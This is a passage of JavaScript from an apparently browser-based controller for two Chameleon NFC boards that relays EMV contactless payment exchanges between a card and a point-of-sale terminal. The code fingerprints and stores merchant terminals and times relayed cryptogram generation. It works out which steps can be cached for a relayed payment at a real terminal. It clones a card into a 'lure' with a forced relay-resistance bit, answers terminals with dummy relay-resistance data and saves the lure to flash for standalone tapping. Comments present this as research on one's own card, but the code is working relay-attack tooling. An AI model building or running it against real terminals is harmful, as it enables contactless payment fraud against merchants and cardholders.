  return out;
}
// Stable terminal-identifying tags (label + fingerprint inclusion).
const RDR_TAGS = {
  0x9F1A: 'country', 0x9F35: 'termType', 0x9F33: 'caps', 0x9F40: 'addlCaps',
  0x9F66: 'ttq', 0x9F1C: 'termId', 0x9F1E: 'ifdSerial', 0x9F4E: 'merchant',
  0x9F16: 'merchantId', 0x9F15: 'mcc', 0x9F3C: 'refCurrency', 0x9F1D: 'termRiskMgmt',
};
function mergeTermData(dst, td) { for (const t in td) { if (RDR_TAGS[t] && td[t] && td[t].length) dst[t] = td[t]; } }
function readerFingerprint(td) {
  const parts = [];
  for (const t of Object.keys(RDR_TAGS).map(Number).sort((a, b) => a - b))
    if (td[t] && td[t].length) parts.push(t.toString(16) + ':' + hxc(td[t]));
  return parts.join('|');
}
const CTRY = { '0056': 'BE', '0250': 'FR', '0276': 'DE', '0528': 'NL', '0826': 'GB', '0840': 'US', '0724': 'ES', '0380': 'IT' };
function readerSummary(td) {
  const bits = [];
  if (td[0x9F1A]) { const c = hxc(td[0x9F1A]); bits.push('country ' + (CTRY[c] || c)); }
  if (td[0x9F35]) bits.push('type ' + hxc(td[0x9F35]));
  if (td[0x9F66]) bits.push('TTQ ' + hxc(td[0x9F66]));
  if (td[0x9F1C]) bits.push('termID ' + hxc(td[0x9F1C]));
  if (td[0x9F1E]) bits.push('IFD ' + hxc(td[0x9F1E]));
  return bits.join(' · ') || 'no terminal data captured';
}
function loadReaders() { try { return JSON.parse(localStorage.getItem('emvReaders') || '[]'); } catch (_) { return []; } }
function saveReaders(r) { try { localStorage.setItem('emvReaders', JSON.stringify(r)); } catch (_) {} }
// Save/merge a reader after a session. Matches by fingerprint when we captured
// one; otherwise stores an unrecognisable entry (empty-PDOL card, blocked before
// GENERATE AC) that the user names by hand. verdict: enforced|no-ea|idle.
function recordReader(td, verdict) {
  const fp = readerFingerprint(td);
  if (!fp && verdict === 'idle') return null;       // nothing worth storing
  const list = loadReaders();
  const now = Date.now();
  let r = fp ? list.find(x => x.fp === fp) : null;
  if (r) {
    r.seen++; r.last = now; r.tags = td && Object.keys(td).length ? hexTags(td) : r.tags;
    if (verdict === 'enforced') r.rrp = 'enforced';
    else if (verdict === 'no-ea' && r.rrp !== 'enforced') r.rrp = 'no-ea';
  } else {
    r = { id: 'r' + now.toString(36), name: 'Reader ' + (list.length + 1), fp,
          tags: hexTags(td), rrp: verdict, seen: 1, first: now, last: now };
    list.push(r);
  }
  saveReaders(list);
  return r;
}
function hexTags(td) { const o = {}; for (const t in td) if (td[t]) o[t] = hxc(td[t]); return o; }
function rrpLabel(v) { return v === 'enforced' ? '⚠ enforces RRP' : v === 'no-ea' ? '✓ no RRP seen' : v === 'idle' ? '— (no flow)' : '?'; }
// Called mid-run once we've captured terminal data: if its fingerprint matches a
// stored reader, announce the recognition once.
function noteReader() {
  if (recognisedThisRun) return;
  const fp = readerFingerprint(curTermData);
  if (!fp) return;
  const hit = loadReaders().find(x => x.fp === fp);
  if (hit) { recognisedThisRun = true; log(`recognised reader: "${hit.name}" (${rrpLabel(hit.rrp)}, seen ${hit.seen}×) — ${readerSummary(curTermData)}`, 'ok'); }
  else { recognisedThisRun = true; log(`new reader fingerprint — ${readerSummary(curTermData)} (saved on Stop)`, 'ok'); }
}
// Log each board's negotiated BLE interval so we can see the real relay-latency
// floor (and whether a native app forcing CONNECTION_PRIORITY_HIGH would help).
async function logConnParams() {
  for (const [name, b] of [['ghost', ghost], ['mole', mole]]) {
    if (!b || typeof b.connParams !== 'function') continue;
    const p = await b.connParams();
    if (!p) { log(`${name} BLE interval: unknown (old firmware or remote board)`, 'warn'); continue; }
    const near = p.maxMs <= 16;
    log(`${name} BLE interval: ${p.minMs.toFixed(2)}–${p.maxMs.toFixed(2)} ms (latency ${p.latency}, timeout ${p.timeoutMs} ms) — ${near ? 'already near the 7.5–15 ms floor; a native app would NOT help' : 'THROTTLED above 15 ms; a native app (CONNECTION_PRIORITY_HIGH) would help'}`, near ? 'ok' : 'warn');
  }
}
function unhexTags(t) { const o = {}; for (const k in (t || {})) o[k] = hexToBytes(t[k]); return o; }
function esc(s) { return String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c])); }
// Render the stored-reader table into #readers-panel.
function renderReaders() {
  const panel = $('readers-panel'); if (!panel) return;
  const list = loadReaders().sort((a, b) => b.last - a.last);
  if (!list.length) { panel.innerHTML = '<div style="color:var(--muted);padding:8px 4px">No readers stored yet. Run a relay against a reader (RRP verdict is stored even when no fingerprint is captured, but only fingerprinted readers auto-recognise).</div>'; return; }
  let h = `<div style="margin-bottom:8px;display:flex;justify-content:space-between;align-items:center"><span style="color:var(--muted)">${list.length} reader(s) — RRP verdicts + last-seen</span><button class="rdr-csv" style="padding:4px 10px">Download CSV</button></div>`
        + '<table style="width:100%;border-collapse:collapse;font-size:12px">'
        + '<tr style="color:var(--muted);text-align:left"><th style="padding:4px 6px">Reader</th><th>RRP</th><th>Terminal</th><th>Seen</th><th>Last</th><th></th></tr>';
  for (const r of list) {
    const sum = r.fp ? readerSummary(unhexTags(r.tags)) : '(no fingerprint — name it yourself)';
    h += `<tr style="border-top:1px solid var(--line)">`
       + `<td style="padding:4px 6px;font-weight:600">${esc(r.name)}</td>`
       + `<td>${esc(rrpLabel(r.rrp))}</td>`
       + `<td style="color:var(--muted)">${esc(sum)}</td>`
       + `<td>${r.seen}</td>`
       + `<td style="color:var(--muted);white-space:nowrap">${new Date(r.last).toLocaleString()}</td>`
       + `<td style="white-space:nowrap"><button class="rdr-rename" data-id="${r.id}" style="padding:3px 8px">Rename</button> <button class="rdr-del" data-id="${r.id}" style="padding:3px 8px">Delete</button></td>`
       + `</tr>`;
  }
  panel.innerHTML = h + '</table>';
}
function toggleReaders() {
  const panel = $('readers-panel'); if (!panel) return;
  panel.hidden = !panel.hidden;
  if (!panel.hidden) renderReaders();
}
function renameReader(id) {
  const list = loadReaders(); const r = list.find(x => x.id === id); if (!r) return;
  const name = prompt('Reader name:', r.name); if (name == null) return;
  r.name = name.trim() || r.name; saveReaders(list); renderReaders();
}
function deleteReader(id) {
  const list = loadReaders().filter(x => x.id !== id); saveReaders(list); renderReaders();
}
// Download the stored reader list + the on-screen log as one timestamped JSON.
function exportData() {
  const logLines = Array.from($('log').children).map(n => n.textContent);
  const readers = loadReaders();
  const bundle = { exported: new Date().toISOString(), build: BUILD, readers, log: logLines };
  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const blob = new Blob([JSON.stringify(bundle, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = `chameleon-relay-${stamp}.json`;
  document.body.appendChild(a); a.click(); a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 2000);
  log(`exported ${readers.length} reader(s) + ${logLines.length} log line(s) → ${a.download}`, 'ok');
}

// Payment-flow latency test on YOUR OWN card (mole-driven, no POS). Runs
// PPSE->SELECT->GPO->READ->GENERATE AC with synthetic terminal data and times
// GENERATE AC. Produces a structurally-valid ARQC for LATENCY MEASUREMENT ONLY —
// it is never submitted anywhere (that would be fraud). Full relay round-trip is
// estimated = measured card time + the ghost/BLE leg seen in live-read logs.
async function testPayment() {
  if (running) { log('stop the relay first, then Test payment', 'warn'); return; }
  if (!mole.connected) { log('connect the mole board first', 'warn'); return; }
  const M = mole;
  try { await M.changeMode(true); } catch (_) {}
  try { await M.relayStop(); } catch (_) {}
  log('payment test: opening card on the mole…', 'ok');
  let anti = null;
  for (let k = 0; k < 20; k++) {
    try { const r = await M.relayStart(); if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) { anti = r.parsed; break; } } catch (_) {}
    await sleep(300);
  }
  if (!anti) { log('payment test: no card on the mole', 'warn'); return; }
  const timed = async (apdu) => {
    const t0 = performance.now();
    let d = new Uint8Array(0);
    try { const r = await M.relayApdu(apdu); if (r.status === ST.HF_TAG_OK) d = r.data; } catch (_) {}
    return { d, ms: performance.now() - t0 };
  };
  const fci = (await timed(hexToBytes('00A404000E325041592E5359532E444446303100'))).d;
  const seen = new Set();
  const aids = parseAids(fci).filter(a => { const h = hxc(a); if (seen.has(h)) return false; seen.add(h); return true; });
  let done = false;
  for (const aid of aids) {
    if (done) break;
    const selResp = (await timed(concat(u8([0x00, 0xa4, 0x04, 0x00, aid.length]), aid, u8([0x00])))).d;
    if (!sw9000(selResp)) continue;
    // GPO with the card's PDOL (9F38) filled, else empty
    const pdol = tlvFind(selResp, 0x9f38)[0];
    const gpoData = pdol ? concat(u8([0x83]), u8([buildDol(pdol).length]), buildDol(pdol)) : hexToBytes('8300');
    const gpoCmd = concat(u8([0x80, 0xa8, 0x00, 0x00, gpoData.length]), gpoData, u8([0x00]));
    const gpo = await timed(gpoCmd);
    if (!sw9000(gpo.d)) { log(`payment test ${hxc(aid)}: GPO -> ${hxc(gpo.d.slice(-2))}`, 'warn'); continue; }
    // read records to find CDOL1 (8C)
    let cdol1 = null; const records = [];
    for (const { sfi, r1, r2 } of parseAfl(gpo.d)) {
      for (let rec = r1; rec <= r2; rec++) {
        const rd = (await timed(u8([0x00, 0xb2, rec, (sfi << 3) | 0x04, 0x00]))).d;
        if (sw9000(rd)) { records.push(rd); const c = tlvFind(rd, 0x8c)[0]; if (c) cdol1 = c; }
      }
    }
    if (!cdol1) { log(`payment test ${hxc(aid)}: no CDOL1 (tag 8C) found — cannot GENERATE AC on this AID`, 'warn'); continue; }
    // GENERATE AC (ARQC, P1=0x80) with synthetic CDOL data
    const cdolData = buildDol(cdol1);
    const genac = concat(u8([0x80, 0xae, 0x80, 0x00, cdolData.length]), cdolData, u8([0x00]));
    const ac = await timed(genac);
    const ok = ac.d.length > 2 && sw9000(ac.d);
    log(`payment test AID ${hxc(aid)}: GENERATE AC -> ${ok ? 'cryptogram returned' : 'SW ' + hxc(ac.d.slice(-2) || [])}`, ok ? 'ok' : 'warn');
    if (ok) {
      const cid = tlvFind(ac.d, 0x9f27)[0], atc = tlvFind(ac.d, 0x9f36)[0], arqc = tlvFind(ac.d, 0x9f26)[0];
      log(`   CID=${cid ? hxc(cid) : '?'} ATC=${atc ? hxc(atc) : '?'} cryptogram=${arqc ? hxc(arqc) : '(in 77 template)'}`);
      log(`   GENERATE AC card time (mole-direct): ${ac.ms.toFixed(0)} ms`, 'ok');
      log(`   est. FULL relay round-trip ≈ ${ac.ms.toFixed(0)} + ~200 ms (ghost+BLE leg from read logs) ≈ ${(ac.ms + 200).toFixed(0)} ms`, 'ok');
      log(`   (structurally-valid ARQC for latency only — NOT submitted anywhere)`, 'warn');
      done = true;
    }
  }
  if (!done) log('payment test: no AID produced a cryptogram (card may need CDA/P1=0x90 or a fuller CDOL)', 'warn');
  try { await M.relayStop(); } catch (_) {}
  log('payment test done.', 'ok');
}

// Cache-safety bench test (mole-direct, no POS). Proves which EMV steps are
// STATE-CRITICAL — i.e. which ones a real-POS payment needs LIVE and therefore
// cannot be served from the static cache. Runs three passes on YOUR card:
//   baseline  : SELECT->GPO->READ->GENERATE AC live, in order   (expect cryptogram)
//   hybrid A  : cache PPSE+SELECT+GPO, relay only GENERATE AC    (card fresh)
//   hybrid B  : SELECT live, cache GPO (skip), relay GENERATE AC
// If GENERATE AC fails whenever GPO wasn't live, caching GPO breaks payment.
async function testCacheSafety() {
  if (running) { log('stop the relay first, then Test cache-safety', 'warn'); return; }
  if (!mole.connected) { log('connect the mole board first', 'warn'); return; }
  const M = mole;
  const apdu = async (b) => { try { const r = await M.relayApdu(b); return r.status === ST.HF_TAG_OK ? r.data : new Uint8Array(0); } catch (_) { return new Uint8Array(0); } };
  const swOf = (d) => d.length >= 2 ? hxc(d.slice(-2)) : '(no response)';
  const crypto_ = (d) => d.length > 2 && sw9000(d);
  const reopen = async () => { try { await M.relayStop(); } catch (_) {} for (let k = 0; k < 15; k++) { try { const r = await M.relayStart(); if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) return true; } catch (_) {} await sleep(250); } return false; };
  try { await M.changeMode(true); } catch (_) {}
  log('cache-safety test: proves which EMV steps must be LIVE (uncacheable) at a real POS. Mole-direct, no POS. Card on mole.', 'ok');
  if (!(await reopen())) { log('cache-safety: no card on the mole', 'warn'); return; }
  // Discover a working AID + its CDOL1 via one correct live pass (the baseline).
  const fci = await apdu(hexToBytes('00A404000E325041592E5359532E444446303100'));
  let aid = null, cdol1 = null, baseCrypto = false;
  for (const a of parseAids(fci)) {
    const sel = await apdu(concat(u8([0x00, 0xa4, 0x04, 0x00, a.length]), a, u8([0x00])));
    if (!sw9000(sel)) continue;
    const pdol = tlvFind(sel, 0x9f38)[0];
    const gpoData = pdol ? concat(u8([0x83]), u8([buildDol(pdol).length]), buildDol(pdol)) : hexToBytes('8300');
    const gpo = await apdu(concat(u8([0x80, 0xa8, 0x00, 0x00, gpoData.length]), gpoData, u8([0x00])));
    if (!sw9000(gpo)) continue;
    for (const { sfi, r1, r2 } of parseAfl(gpo)) for (let rec = r1; rec <= r2; rec++) { const rd = await apdu(u8([0x00, 0xb2, rec, (sfi << 3) | 0x04, 0x00])); const c = tlvFind(rd, 0x8c)[0]; if (c) cdol1 = c; }
    if (!cdol1) continue;
    const ac = await apdu(concat(u8([0x80, 0xae, 0x80, 0x00, buildDol(cdol1).length]), buildDol(cdol1), u8([0x00])));
    aid = a; baseCrypto = crypto_(ac);
    log(`baseline (all live, in order) on ${hxc(a)}: GENERATE AC → ${baseCrypto ? 'CRYPTOGRAM ✓' : swOf(ac)}`, baseCrypto ? 'ok' : 'warn');
    break;
  }
  if (!aid || !cdol1) { log('cache-safety: this card never reached GENERATE AC live — try a payment card that does (voucher/Bancontact work).', 'warn'); try { await M.relayStop(); } catch (_) {} return; }
  const genacCmd = concat(u8([0x80, 0xae, 0x80, 0x00, buildDol(cdol1).length]), buildDol(cdol1), u8([0x00]));
  const selCmd = concat(u8([0x00, 0xa4, 0x04, 0x00, aid.length]), aid, u8([0x00]));
  // Hybrid A: everything cached except GENERATE AC (card fresh, never selected).
  await reopen();
  const hbA = await apdu(genacCmd);
  log(`hybrid A — cache PPSE+SELECT+GPO, relay only GENERATE AC (card never selected): GENERATE AC → ${swOf(hbA)} ${crypto_(hbA) ? '✓' : '✗'}`, crypto_(hbA) ? 'ok' : 'warn');
  // Hybrid B: SELECT live, GPO cached (skipped), GENERATE AC live — the exact
  // "cached GPO" case the portal's prefill would produce at a real POS.
  await reopen();
  const selB = await apdu(selCmd);
  const hbB = await apdu(genacCmd);
  log(`hybrid B — SELECT live, cache GPO (skipped), relay GENERATE AC: SELECT→${swOf(selB)}, GENERATE AC→${swOf(hbB)} ${crypto_(hbB) ? '✓' : '✗'}`, crypto_(hbB) ? 'ok' : 'warn');
  // Verdict.
  if (baseCrypto && !crypto_(hbB))
    log(`VERDICT: GPO is STATE-CRITICAL — cryptogram ONLY with a live GPO; a cached/skipped GPO gives ${swOf(hbB)} at GENERATE AC. ⇒ caching GPO BREAKS a real-POS payment. Cache OFF for payment; caching only static reads (PPSE/SELECT/records) with a live GPO+GENERATE AC is the sound design.`, 'warn');
  else if (baseCrypto && crypto_(hbB))
    log('VERDICT: this card produced a cryptogram even without a live GPO — unusual (some cards are lax). Caching GPO happened to be tolerated here, but is NOT safe in general.', 'warn');
  else
    log('VERDICT: inconclusive — baseline did not reach a cryptogram; re-run with a card that completes GENERATE AC.', 'warn');
  try { await M.relayStop(); } catch (_) {}
  log('cache-safety test done.', 'ok');
}

// RRP-capability readout for YOUR OWN card: read each AID's AIP (Relay Resistance
// bit) and probe EXCHANGE RELAY RESISTANCE DATA (80 EA). Tells you whether the card
// is relay-hardened. Diagnostic only; run with the card on the mole, relay stopped.
async function checkRRP() {
  if (running) { log('stop the relay first, then Check RRP', 'warn'); return; }
  if (!mole.connected) { log('connect the mole board first', 'warn'); return; }
  const M = mole;
  try { await M.changeMode(true); } catch (_) {}
  try { await M.relayStop(); } catch (_) {}
  log('RRP check: reading card on the mole…', 'ok');
  let anti = null;
  for (let i = 0; i < 20; i++) {
    try { const r = await M.relayStart(); if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) { anti = r.parsed; break; } } catch (_) {}
    await sleep(300);
  }
  if (!anti) { log('RRP check: no card on the mole', 'warn'); return; }
  const rly = async (a) => { try { const r = await M.relayApdu(a); return r.status === ST.HF_TAG_OK ? r.data : new Uint8Array(0); } catch (_) { return new Uint8Array(0); } };
  const fci = await rly(hexToBytes('00A404000E325041592E5359532E444446303100'));
  const seen = new Set();
  const aids = parseAids(fci).filter(a => { const h = hxc(a); if (seen.has(h)) return false; seen.add(h); return true; });
  if (!aids.length) { log('RRP check: no AIDs in PPSE (card read failed?)', 'warn'); }
  for (const aid of aids) {
    const sel = concat(u8([0x00, 0xa4, 0x04, 0x00, aid.length]), aid, u8([0x00]));
    if (!sw9000(await rly(sel))) { log(`RRP: ${hxc(aid)} SELECT failed`, 'warn'); continue; }
    const gr = await rly(hexToBytes('80A8000002830000'));
    const aip = tlvFind(gr, 0x82)[0];
    // Relay-Resistance-Supported is AIP BYTE 2, bit 1 (0x01): e.g. 1981=RRP, 1980=no.
    const aipBit = aip && aip.length >= 2 ? !!(aip[1] & 0x01) : null;
    // Probe: EXCHANGE RELAY RESISTANCE DATA, 4-byte terminal entropy
    const rrp = await rly(hexToBytes('80EA000004AABBCCDD00'));
    const supported = rrp.length > 2 && sw9000(rrp);   // real RRP response vs error SW
    const sw = rrp.length >= 2 ? hxc(rrp.slice(-2)) : '(none)';
    log(`RRP  AID ${hxc(aid)}: AIP=${aip ? hxc(aip) : '?'} (relay-resist bit≈${aipBit}) · 80EA probe → ${supported ? 'SUPPORTED (relay-hardened)' : 'not supported (SW ' + sw + ')'}`,
        supported ? 'warn' : 'ok');
  }
  try { await M.relayStop(); } catch (_) {}
  log('RRP check done. (AIP bit is best-effort; the 80EA probe result is authoritative.)', 'ok');
}

// ---------------------------------------------------------------------------
// RRP POS TEST (item 2): does a POS actually USE relay resistance?
// The ghost emulates a card that ADVERTISES RRP (AIP byte-2 bit-1 forced on).
// Tap it on the POS and watch what the POS sends after GPO:
//   * 80 EA (EXCHANGE RELAY RESISTANCE DATA)  => this POS USES/ENFORCES RRP.
//   * 00 B2 (READ RECORD) with no prior 80 EA => this POS does NOT use RRP.
// A "yes" is conclusive. A "no" is only trustworthy because our lure genuinely
// advertises RRP (that's the whole point of forcing the AIP bit).
// The lure is captured once from your real card over the mole (PPSE/SELECT/GPO,
// empty-PDOL so the POS's GPO command is fixed and cache-matches), GPO AIP forced
// to advertise RRP, and saved to localStorage. Records are deliberately NOT cached
// so the POS's post-GPO command always reaches this loop for the verdict.
let rrpTestRunning = false;
const RRP_PROFILE_KEY = 'rrpPosCardV1';

function forceRrpAip(gpo) {           // set AIP byte-2 bit-1 (0x01) = RRP supported, IN PLACE
  // GPO format 2: 77 .. 82 02 <AIP> ..   |   format 1: 80 <len> <AIP(2)> <AFL>
  // (tlvFind returns COPIES via .slice, so we must patch the raw bytes directly.)
  if (gpo.length >= 4 && gpo[0] === 0x80) { gpo[3] |= 0x01; return true; }
  for (let j = 0; j + 3 < gpo.length; j++) {
    if (gpo[j] === 0x82 && gpo[j + 1] === 0x02) { gpo[j + 3] |= 0x01; return true; }
  }
  return false;
}

async function captureRrpLure(M) {    // clone + PPSE + SELECT + GPO(RRP-forced); records NOT cached
  try { await M.relayStop(); } catch (_) {}
  const r = await M.relayStart();
  if (!(r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length)) return null;
  const anti = r.parsed, pairs = [];
  const rly = async (a) => { try { const x = await M.relayApdu(a); return x.status === ST.HF_TAG_OK ? x.data : new Uint8Array(0); } catch (_) { return new Uint8Array(0); } };
  const PPSE = hexToBytes('00A404000E325041592E5359532E444446303100');
  const fci = await rly(PPSE);
  if (!(fci.length > 2)) return null;
  pairs.push({ cmd: PPSE, resp: fci });
  const seen = new Set();
  const aids = parseAids(fci).filter(a => { const h = hxc(a); if (seen.has(h)) return false; seen.add(h); return true; });
  const GPO = hexToBytes('80A8000002830000');
  let gpoForced = false;
  for (const aid of aids) {
    const sel = concat(u8([0x00, 0xa4, 0x04, 0x00, aid.length]), aid, u8([0x00]));
    const sr = await rly(sel);
    if (!sw9000(sr)) continue;
    pairs.push({ cmd: sel, resp: sr });          // SELECT cached (needed standalone)
    const gr = await rly(GPO);
    if (sw9000(gr)) {
      const before = tlvFind(gr, 0x82)[0];
      const ok = forceRrpAip(gr);                  // GPO cached, RRP-advertising (patched in place)
      const after = tlvFind(gr, 0x82)[0];
      log(`lure: ${hxc(aid)} GPO AIP ${before ? hxc(before) : '?'} -> ${after ? hxc(after) : '?'} (RRP bit ${ok ? 'SET' : 'NOT FOUND'})`, ok ? 'ok' : 'warn');
      pairs.push({ cmd: GPO, resp: gr }); gpoForced = gpoForced || ok;
    }
  }
  try { await M.relayStop(); } catch (_) {}
  if (!gpoForced) { log('lure: no AID reached GPO — cannot build an RRP-advertising card', 'err'); return null; }
  return { anti, pairs };
}

function saveRrpLure(p) {
  try { localStorage.setItem(RRP_PROFILE_KEY, JSON.stringify({
    anti: { uid: hxc(p.anti.uid), atqa: hxc(p.anti.atqa), sak: p.anti.sak, ats: hxc(p.anti.ats) },
    pairs: p.pairs.map(x => ({ cmd: hxc(x.cmd), resp: hxc(x.resp) })) })); } catch (_) {}
}
function loadRrpLure() {
  try { const j = JSON.parse(localStorage.getItem(RRP_PROFILE_KEY) || 'null'); if (!j) return null;
    return { anti: { uid: hexToBytes(j.anti.uid), atqa: hexToBytes(j.anti.atqa), sak: j.anti.sak, ats: hexToBytes(j.anti.ats) },
             pairs: j.pairs.map(x => ({ cmd: hexToBytes(x.cmd), resp: hexToBytes(x.resp) })) }; } catch (_) { return null; }
}

// Build the RRP lure from your card on the MOLE (mole-only action). Saves to
// localStorage; the ghost then serves it standalone in the RRP POS test.
async function buildRrpLure() {
  if (running || rrpTestRunning || sniffRunning) { log('stop the current session first', 'warn'); return; }
  const dev = mole.connected ? mole : (ghost.connected ? ghost : null);   // whichever board is connected
  if (!dev) { log('connect a board and put your card on it to build the lure', 'err'); return; }
  log(`Build RRP lure: reading your card on the ${dev.label} — place the card…`, 'warn');
  await dev.changeMode(true);   // reader mode
  let lure = null;
  for (let i = 0; i < 40 && !lure; i++) {
    try { if ((await dev.cardProbe(true)).status === ST.HF_TAG_OK) lure = await captureRrpLure(dev); } catch (_) {}
    if (!lure) await sleep(300);
  }
  if (!lure) { log('could not read a card to build the lure', 'err'); return; }
  saveRrpLure(lure);
  log(`RRP lure built (${lure.pairs.length} responses; GPO AIP advertises RRP) and saved. Now click "RRP POS test" and tap on the POS.`, 'ok');
}

// Persist the RRP lure into a DEDICATED SLOT's flash so it survives a reboot /
// localStorage clear and can be used standalone: switch the board to the slot
// with its button and tap a POS. Bakes in an 80 EA answer + a READ RECORD
// fallback so the emulated card is self-sufficient with no host attached; the
// standalone-verdict firmware then flashes RED (POS uses RRP) / GREEN (it does
// not) on the tap. Builds the lure from your card first if none is saved yet.
async function saveLureToSlot() {
  if (running || rrpTestRunning || sniffRunning) { log('stop the current session first', 'warn'); return; }
  const boards = [ghost, mole].filter(b => b.connected);   // provision EVERY connected board
  if (!boards.length) { log('connect a board first', 'err'); return; }
  const slot = parseInt($('lure-slot').value, 10) || 8;
  let lure = loadRrpLure();
  if (!lure) {
    const rdr = boards[0];
    log(`no saved lure — reading your card on the ${rdr.label} to build one first…`, 'warn');
    await rdr.changeMode(true);
    for (let i = 0; i < 40 && !lure; i++) {
      try { if ((await rdr.cardProbe(true)).status === ST.HF_TAG_OK) lure = await captureRrpLure(rdr); } catch (_) {}
      if (!lure) await sleep(300);
    }
    if (!lure) { log('could not read a card to build the lure', 'err'); return; }
    saveRrpLure(lure);
  }
  // captured PPSE/SELECT/GPO + standalone self-sufficiency answers. cmd is a
  // PREFIX (firmware matches apdu_len>=cmd_len && memcmp), so 2-byte cmds catch
  // any EXCHANGE RRP / READ RECORD regardless of their trailing data.
  const pairs = lure.pairs.slice();
  pairs.push({ cmd: hexToBytes('80EA'), resp: hexToBytes('000000000001000200019000') }); // any 80 EA -> dummy RRP ok
  pairs.push({ cmd: hexToBytes('00B2'), resp: hexToBytes('6A83') });                       // any READ RECORD -> not found
  if (pairs.length > 12) log(`warning: ${pairs.length} responses exceed the 12 flash slots — extras go to RAM and won't persist standalone`, 'warn');
  for (const dev of boards) {
    try {
      log(`saving RRP lure to slot ${slot} on the ${dev.label} — persisting to flash…`, 'warn');
      await dev.setActiveSlot(slot);
      await dev.setSlotTagType(slot, TAG_HF14A_4);
      await dev.setSlotDataDefault(slot, TAG_HF14A_4);   // valid baseline record before we overwrite it
      await dev.setSlotEnable(slot, SENSE_HF, true);
      await dev.clearStaticResponses();
      await dev.setAntiColl(lure.anti);
      const n = await dev.addStaticResponseBatch(pairs);
      await dev.saveSlotToFlash();
      try { await dev.setSlotNick(slot, SENSE_HF, 'RRP-LURE'); } catch (_) {}
      await dev.changeMode(false);   // leave it emulating on that slot, ready to tap
      log(`✓ ${dev.label}: RRP lure saved to slot ${slot} (${n} responses persisted, named "RRP-LURE").`, 'ok');
    } catch (e) {
      log(`save lure to slot failed on the ${dev.label}: ${e}`, 'err');
    }
  }
  log(`Standalone use: switch the board to slot ${slot} with its button and tap a POS — with the standalone-verdict firmware, BLUE while tapping, then RED (POS uses RRP) / GREEN (no RRP).`, 'ok');
}

// RRP POS test: arm the GHOST with the saved lure and watch for 80 EA (ghost-only).
async function rrpPosTest() {
  if (rrpTestRunning) { rrpTestRunning = false; log('stopping RRP POS test…', 'warn'); return; }
  if (running || sniffRunning) { log('stop the current session first', 'warn'); return; }
  const dev = ghost.connected ? ghost : (mole.connected ? mole : null);   // whichever board is connected
  if (!dev) { log('connect a board first (the one you tap on the POS)', 'err'); return; }
  const lure = loadRrpLure();
  if (!lure) { log('no saved lure — put your card on a connected board and click "Build RRP lure" first', 'err'); return; }
  const slot = parseInt($('lure-slot').value, 10) || parseInt($('slot').value, 10) || 8;
  log(`RRP POS test: using saved lure (${lure.pairs.length} responses) on slot ${slot}.`, 'ok');

  rrpTestRunning = true;
  if ($('rrptest-btn')) $('rrptest-btn').textContent = 'Stop RRP test';
  setRrpBadge('watch');
  log(`=== RRP POS TEST armed: the ${dev.label} is emulating an RRP-advertising card. TAP IT ON THE POS. ===`, 'ok');
  try {
    await armGhost(lure.anti, slot, lure.pairs, dev);
    dev.setLed(6).catch(() => {}); setLedUI(dev.label, 'blue');   // blue: armed, waiting for the tap
    const EMPTY = new Uint8Array(0);
    let pending = EMPTY, verdict = null, idle = 0, sessionStored = false;
    const storeVerdict = (rrpState) => {
      if (sessionStored) return;
      sessionStored = true;
      const rec = recordReader({}, rrpState);   // no fingerprint (empty-PDOL lure) — user names it
      if (rec) { log(`stored in Readers as "${rec.name}" (${rrpLabel(rec.rrp)}) — rename it to this terminal`, 'ok'); const p = $('readers-panel'); if (p && !p.hidden) renderReaders(); }
    };
    while (rrpTestRunning) {
      let r; try { r = await dev.apduSendRecv(pending, 600); } catch (_) { pending = EMPTY; continue; }
      pending = EMPTY;
      if (r.status !== ST.SUCCESS) {           // no APDU this window
        if (verdict && ++idle > 3) { log('— tap ended; tap again to re-test, or Stop —', 'ok'); verdict = null; idle = 0; setRrpBadge('watch');
          dev.setLed(6).catch(() => {}); setLedUI(dev.label, 'blue'); }   // re-arm blue for the next tap
        continue;
      }
      idle = 0;
      const apdu = r.data;
      if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xEA) {
        if (verdict !== 'rrp') { log('✓✓ POS SENT 80 EA (EXCHANGE RELAY RESISTANCE DATA) — THIS POS USES RRP', 'warn'); storeVerdict('enforced'); }
        setRrpBadge('enforced'); verdict = 'rrp';
        dev.setLed(7).catch(() => {}); setLedUI(dev.label, 'red');   // red: POS uses RRP
        pending = hexToBytes('000000000001000200019000');   // dummy RRP response so the POS proceeds
      } else if (apdu.length >= 2 && apdu[0] === 0x00 && apdu[1] === 0xB2) {
        if (!verdict) { log('POS went to READ RECORD after GPO with NO 80 EA — THIS POS does NOT use RRP', 'ok'); setRrpBadge('clear'); verdict = 'norrp'; storeVerdict('no-ea');
          dev.setLed(8).catch(() => {}); setLedUI(dev.label, 'green'); }   // green: no RRP
        pending = hexToBytes('6A83');
      } else {
        // After a verdict the reader often brute-forces its whole AID list (our
        // lure only answers 2 AIDs) — that's normal; log only before the verdict.
        if (!verdict) log('  ghost saw: ' + hex(apdu).trim());
        pending = hexToBytes('6D00');
      }
    }
  } catch (e) {
    log('RRP POS test error: ' + e, 'err');
  } finally {
    try { await dev.changeMode(true); } catch (_) {}
    dev.setLed(5).catch(() => {});
    rrpTestRunning = false;
    if ($('rrptest-btn')) $('rrptest-btn').textContent = 'RRP POS test';
    log('=== RRP POS TEST stopped ===', 'ok');
  }
}

// ---------------------------------------------------------------------------
// PASSIVE SNIFF (item 1): eavesdrop the reader->card command stream of a REAL
// reader talking to a REAL card. Place the sniffer board between the reader and
// the card, run a transaction, and every reader->card frame is logged — so you
// can see whether a real POS actually issued 80 EA (RRP) with that card.
// LIMIT: only the reader->card half is capturable (the NFCT can't demodulate a
// real card's load-modulated replies) — so card responses never appear. Also,
// whether the NFCT delivers the DATA frames (APDUs) while unselected is a
// hardware unknown we are testing here; if only anticollision shows up, that is
// the limitation, not a bug.
function sniffLabel(f, bits) {
  if (bits <= 8) {
    if (f[0] === 0x26) return { tag: 'REQA' };
    if (f[0] === 0x52) return { tag: 'WUPA' };
    return { tag: '(short)' };
  }
  const pcb = f[0];
